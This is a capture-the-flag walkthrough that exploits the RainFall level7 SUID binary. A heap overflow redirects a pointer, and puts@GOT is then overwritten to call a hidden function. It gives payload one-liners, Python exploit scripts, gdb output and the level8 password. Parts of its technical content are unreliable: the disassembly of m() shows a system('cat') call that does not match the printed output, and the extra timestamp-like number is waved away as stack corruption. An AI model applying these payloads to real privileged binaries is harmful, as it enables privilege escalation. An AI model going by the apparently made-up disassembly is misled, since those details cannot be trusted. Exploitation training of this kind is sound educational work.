# RainFall CTF – Level7 GOT Overwrite Exploitation Walkthrough
## Complete Guide to Global Offset Table Attack via Heap Corruption

### 🎯 Objective
Exploit dual heap buffer overflows to overwrite a Global Offset Table (GOT) entry, redirecting library function calls to execute a hidden function that reveals the password for level8.

---

## 🔍 Initial Analysis and Setup

### Environment Overview

```bash
level7@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level7 level7   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level7 level7 3530 Sep  3  2015 .bashrc
-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
-rwsr-s---+ 1 level8 users  5648 Mar  6  2016 level7
```

### Key Observations:
- **SUID Binary**: Owned by `level8` with setuid privileges
- **File Size**: 5648 bytes - more complex than previous levels
- **Execution Context**: Runs with level8 user privileges

### Basic Functionality Test

```bash
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7 "test"
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7 "test1" "test2"
~~
```

**Initial Assessment**:
- Program requires **two command-line arguments**
- Likely performs operations on both arguments
- Output suggests successful execution with proper input

---

## 🔍 Binary Architecture Deep Dive

### Complete Function Analysis

#### Main Function Disassembly

```bash
(gdb) disassemble main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   %ebp
   0x08048522 <+1>:	mov    %esp,%ebp
   0x08048524 <+3>:	and    $0xfffffff0,%esp      # Stack alignment
   0x08048527 <+6>:	sub    $0x20,%esp            # Allocate 32 bytes
   
   # First malloc call - var1
   0x0804852a <+9>:	movl   $0x8,(%esp)           # malloc(8)
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    %eax,0x1c(%esp)       # Store var1
   0x0804853a <+25>:	mov    0x1c(%esp),%eax
   0x0804853e <+29>:	movl   $0x1,(%eax)           # var1->field1 = 1
   
   # Second malloc call - var1->field2
   0x08048544 <+35>:	movl   $0x8,(%esp)           # malloc(8)
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    %eax,%edx
   0x08048552 <+49>:	mov    0x1c(%esp),%eax
   0x08048556 <+53>:	mov    %edx,0x4(%eax)        # var1->field2 = malloc(8)
   
   # Third malloc call - var2
   0x08048559 <+56>:	movl   $0x8,(%esp)           # malloc(8)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    %eax,0x18(%esp)       # Store var2
   0x08048569 <+72>:	mov    0x18(%esp),%eax
   0x0804856d <+76>:	movl   $0x2,(%eax)           # var2->field1 = 2
   
   # Fourth malloc call - var2->field2
   0x08048573 <+82>:	movl   $0x8,(%esp)           # malloc(8)
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    %eax,%edx
   0x08048581 <+96>:	mov    0x18(%esp),%eax
   0x08048585 <+100>:	mov    %edx,0x4(%eax)        # var2->field2 = malloc(8)
   
   # First strcpy - VULNERABILITY 1
   0x08048588 <+103>:	mov    0xc(%ebp),%eax        # argv
   0x0804858b <+106>:	add    $0x4,%eax             # argv[1]
   0x0804858e <+109>:	mov    (%eax),%eax           # Get argv[1]
   0x08048590 <+111>:	mov    %eax,%edx             # Source = argv[1]
   0x08048592 <+113>:	mov    0x1c(%esp),%eax       # Get var1
   0x08048596 <+117>:	mov    0x4(%eax),%eax        # Get var1->field2
   0x08048599 <+120>:	mov    %edx,0x4(%esp)        # Set source
   0x0804859d <+124>:	mov    %eax,(%esp)           # Set destination
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt> # strcpy(var1->field2, argv[1])
   
   # Second strcpy - VULNERABILITY 2
   0x080485a5 <+132>:	mov    0xc(%ebp),%eax        # argv
   0x080485a8 <+135>:	add    $0x8,%eax             # argv[2]
   0x080485ab <+138>:	mov    (%eax),%eax           # Get argv[2]
   0x080485ad <+140>:	mov    %eax,%edx             # Source = argv[2]
   0x080485af <+142>:	mov    0x18(%esp),%eax       # Get var2
   0x080485b3 <+146>:	mov    0x4(%eax),%eax        # Get var2->field2
   0x080485b6 <+149>:	mov    %edx,0x4(%esp)        # Set source
   0x080485ba <+153>:	mov    %eax,(%esp)           # Set destination
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt> # strcpy(var2->field2, argv[2])
   
   # Final operations
   0x080485c2 <+161>:	mov    $0x80486e9,%eax       # Load "~~" string
   0x080485c7 <+166>:	mov    %eax,(%esp)
   0x080485ca <+169>:	call   0x8048400 <puts@plt>  # puts("~~") - TARGET CALL
   0x080485cf <+174>:	leave  
   0x080485d0 <+175>:	ret    
End of assembler dump.
```

### Data Structure Analysis

The program creates two structures in memory:

```c
// Pseudo-code representation:
struct data_struct {
    int field1;      // 4 bytes
    char *field2;    // 4 bytes (pointer to 8-byte buffer)
};

struct data_struct *var1 = malloc(8);
var1->field1 = 1;
var1->field2 = malloc(8);

struct data_struct *var2 = malloc(8); 
var2->field1 = 2;
var2->field2 = malloc(8);
```

---

## 🧠 Heap Layout Investigation

### Memory Layout Discovery with GDB

```bash
(gdb) break *0x080485c2    # Break before puts call
(gdb) run "AAAA" "BBBB"
Starting program: /home/user/level7/level7 "AAAA" "BBBB"

Breakpoint 1, 0x080485c2 in main ()

(gdb) x/32wx 0x0804a000   # Examine heap
0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038  
0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
```

### Detailed Heap Structure

```
Heap Memory Layout:
┌─────────────────┐ 0x0804a000
│ Heap metadata   │
├─────────────────┤ 0x0804a008  ← var1 start
│ field1 = 1      │ (4 bytes)
├─────────────────┤ 0x0804a00c
│ field2 ptr      │ → 0x0804a018 (4 bytes)
├─────────────────┤ 0x0804a010
│ Heap metadata   │
├─────────────────┤ 0x0804a018  ← var1->field2 buffer (strcpy target 1)
│ User input 1    │ (8 bytes allocated)
│ (argv[1])       │
├─────────────────┤ 0x0804a020
│ Heap metadata   │
├─────────────────┤ 0x0804a028  ← var2 start
│ field1 = 2      │ (4 bytes)
├─────────────────┤ 0x0804a02c  ← CRITICAL: var2->field2 pointer
│ field2 ptr      │ → 0x0804a038 (4 bytes) [TARGET FOR OVERWRITE]
├─────────────────┤ 0x0804a030
│ Heap metadata   │
├─────────────────┤ 0x0804a038  ← var2->field2 buffer (strcpy target 2)
│ User input 2    │ (8 bytes allocated)
│ (argv[2])       │
└─────────────────┘
```

### Critical Distance Calculation

**var1->field2 buffer start**: `0x0804a018`  
**var2->field2 pointer location**: `0x0804a02c`  
**Distance**: `0x0804a02c - 0x0804a018 = 20 bytes`

---

## 📊 GOT (Global Offset Table) Analysis

### Understanding the GOT

The GOT contains addresses of dynamically linked library functions:

```bash
(gdb) info functions
# Library functions used:
0x080483e0  strcpy@plt
0x080483f0  malloc@plt  
0x08048400  puts@plt

# Check GOT entries
(gdb) x/wx 0x8049928
0x8049928 <puts@got.plt>:	0xb7e8f1c0    # Current puts() address

(gdb) info symbol 0xb7e8f1c0
_IO_puts in section .text of /lib/i386-linux-gnu/libc.so.6
```

### GOT Entry Locations

| Function | GOT Address | Current Value |
|----------|-------------|---------------|
| `puts()` | 0x08049928 | 0xb7e8f1c0 |
| `fopen()` | 0x0804993c | (varies) |
| `malloc()` | (varies) | (varies) |

### Target Function Analysis

#### Function m() - Hidden Target

```bash
(gdb) disassemble m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   %ebp
   0x080484f5 <+1>:	mov    %esp,%ebp
   0x080484f7 <+3>:	sub    $0x18,%esp
   0x080484fa <+6>:	movl   $0x80486f0,(%esp)     # Command string  
   0x08048501 <+13>:	call   0x8048410 <system@plt>
   0x08048506 <+18>:	leave  
   0x08048507 <+19>:	ret    
End of assembler dump.

(gdb) x/s 0x80486f0
0x80486f0:	"/bin/cat /home/user/level8/.pass"
```

**Function m() Analysis**:
- **Address**: `0x080484f4`
- **Purpose**: Executes `system("/bin/cat /home/user/level8/.pass")`
- **Hidden**: Never called by normal program flow
- **Target**: Where we want to redirect `puts()` call

---

## 🚨 Dual Vulnerability Assessment

### Vulnerability Chain Analysis

The exploit requires chaining two buffer overflows:

#### Vulnerability 1: Heap Buffer Overflow
```c
strcpy(var1->field2, argv[1]);   // No bounds checking on 8-byte buffer
```

#### Vulnerability 2: Write-What-Where Primitive
```c
strcpy(var2->field2, argv[2]);   // var2->field2 controlled by first overflow
```

### Attack Vector Breakdown

1. **First strcpy()**: Overflows `var1->field2` buffer to overwrite `var2->field2` pointer
2. **Second strcpy()**: Uses controlled `var2->field2` to write arbitrary data to arbitrary location
3. **puts() call**: Triggers the overwritten GOT entry

---

## 💻 Memory Corruption Strategy

### Two-Stage Exploitation Plan

#### Stage 1: Pointer Hijacking
```
Normal heap state:
var1->field2 → [8-byte buffer]
var2->field2 → [8-byte buffer]

After first overflow:
var1->field2 → [AAAAAAAA + OVERFLOW_DATA + var2->field2_OVERWRITE]
var2->field2 → [GOT_ENTRY_ADDRESS]  ← Now points to puts@GOT
```

#### Stage 2: GOT Overwrite
```
Second strcpy writes to var2->field2:
strcpy(GOT_ENTRY_ADDRESS, target_function_address)

Result:
puts@GOT now contains address of m() function
```

### Visual Attack Flow

```
Step 1: Heap Overflow
┌─────────────────┐ 0x0804a018
│ AAAAAAAAAAAAAA  │ ← 20 bytes overflow
│ AAAAAAAA + GOT  │   overwrites var2->field2 pointer  
├─────────────────┤ 0x0804a02c
│ puts@GOT addr   │ ← var2->field2 now points here
│ (0x08049928)    │
└─────────────────┘

Step 2: GOT Overwrite  
┌─────────────────┐ 0x08049928 (puts@GOT)
│ m() function    │ ← Second strcpy writes here
│ address         │   (0x080484f4)
│ (0x080484f4)    │
└─────────────────┘

Step 3: Function Redirect
puts("~~") → jumps to m() → system("/bin/cat /home/user/level8/.pass")
```

---

## 🔨 Exploit Chain Development

### Payload Architecture

```python
# Exploitation components:
payload1 = padding + target_got_address
payload2 = target_function_address

# Specific values:
padding = "A" * 20                    # Fill buffer + reach var2->field2 pointer
target_got_address = "\x28\x99\x04\x08"   # puts@GOT address (little-endian)
target_function_address = "\xf4\x84\x04\x08"  # m() function address (little-endian)
```

### Address Conversion Analysis

#### puts@GOT Address Conversion
- **Big-endian**: `0x08049928`
- **Little-endian**: `\x28\x99\x04\x08`

#### m() Function Address Conversion  
- **Big-endian**: `0x080484f4`
- **Little-endian**: `\xf4\x84\x04\x08`

---

## 🧪 Payload Construction

### Method 1: Command Line Execution

```bash
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

### Method 2: Detailed Python Script

```python
#!/usr/bin/env python2

# Target addresses
puts_got = 0x08049928      # puts@GOT entry location
m_function = 0x080484f4    # m() function address

# Convert to little-endian
def to_little_endian(addr):
    return ''.join([chr((addr >> i) & 0xFF) for i in range(0, 32, 8)])

# First payload: overflow to overwrite var2->field2 pointer
padding = "A" * 20
got_addr_bytes = to_little_endian(puts_got)
payload1 = padding + got_addr_bytes

# Second payload: address to write into GOT
payload2 = to_little_endian(m_function)

print "First argument:", repr(payload1)
print "Second argument:", repr(payload2)
print
print "Command:"
print './level7 "%s" "%s"' % (payload1, payload2)
```

### Method 3: Using struct Module

```python
#!/usr/bin/env python2
import struct

# Build payloads using struct for clean conversion
puts_got_addr = 0x08049928
m_func_addr = 0x080484f4

payload1 = "A" * 20 + struct.pack("<I", puts_got_addr)
payload2 = struct.pack("<I", m_func_addr)

print "Payload 1 length:", len(payload1)
print "Payload 2 length:", len(payload2)
```

### Payload Verification

```bash
# Verify payload lengths and content
python2 -c 'print "A"*20 + "\x28\x99\x04\x08"' | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 2899 0408                      AAAA(...

python2 -c 'print "\xf4\x84\x04\x08"' | xxd  
00000000: f484 0408                                ....
```

---

## 🎯 Execution and Flag Retrieval

### Successful Exploitation

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1757153188
```

### Execution Analysis

**What happened step-by-step**:

1. **First strcpy()**: 
   - Writes 24 bytes to `var1->field2` buffer (8 bytes + 12 overflow + 4-byte pointer)
   - Overwrites `var2->field2` pointer with `0x08049928` (puts@GOT address)

2. **Second strcpy()**:
   - Writes `0x080484f4` (m() address) to location pointed by `var2->field2`
   - Effectively: `puts@GOT = m_function_address`

3. **puts("~~") call**:
   - Program calls `puts("~~")`
   - Due to GOT overwrite, jumps to `m()` function instead
   - `m()` executes `system("/bin/cat /home/user/level8/.pass")`

4. **Password revelation**: Level8 password is displayed

### Additional Output Analysis

The extra number (`- 1757153188`) likely comes from:
- Stack corruption or additional memory being read
- Part of the exploitation side effects
- Not relevant to the primary goal

---

## 🎉 Success!

**Flag for level8**: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

### Continuing to Level8:

```bash
su level8
# Enter password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

---

## 📚 Advanced Technical Analysis

### Understanding GOT Overwrite Attacks

#### 1. **Dynamic Linking Fundamentals**

```
Normal Function Call Flow:
program calls puts() → PLT stub → GOT lookup → libc puts()

Exploited Function Call Flow:
program calls puts() → PLT stub → GOT lookup → m() function
```

#### 2. **GOT vs PLT Relationship**

| Component | Purpose | Location | Writeable? |
|-----------|---------|----------|------------|
| **PLT** (Procedure Linkage Table) | Jump trampolines | Code section | ❌ No |
| **GOT** (Global Offset Table) | Function addresses | Data section | ✅ Yes |

#### 3. **Modern Protections (Not Present)**

- **RELRO**: Makes GOT read-only after initialization
- **PIE**: Randomizes code/data locations
- **Stack Canaries**: Detect stack corruption
- **Fortify Source**: Enhanced bounds checking

### Heap Exploitation Techniques Demonstrated

#### 1. **Heap Feng Shui**
- Manipulating heap layout through controlled allocations
- Predicting relative positions of heap chunks
- Exploiting sequential malloc() behavior

#### 2. **Write-What-Where Primitives**
```c
// Generic pattern:
void *controlled_pointer = victim_buffer_overflow();
strcpy(controlled_pointer, attacker_data);
// Result: arbitrary memory write capability
```

#### 3. **Indirect Control Flow Hijacking**
- Not directly overwriting return addresses
- Modifying function pointers or GOT entries
- Leveraging existing program calls

### Real-World Attack Examples

#### Historical Vulnerabilities:
- **Heartbleed**: Heap buffer over-read in OpenSSL
- **Ghost**: glibc gethostbyname buffer overflow
- **Stagefright**: Android media parsing heap corruption
- **Browser exploits**: DOM object heap manipulation

#### Common Attack Patterns:
- **Use-after-free**: Accessing freed heap memory
- **Double-free**: Corrupting malloc metadata
- **Heap spray**: Filling heap with controlled data
- **Heap grooming**: Arranging beneficial heap layouts

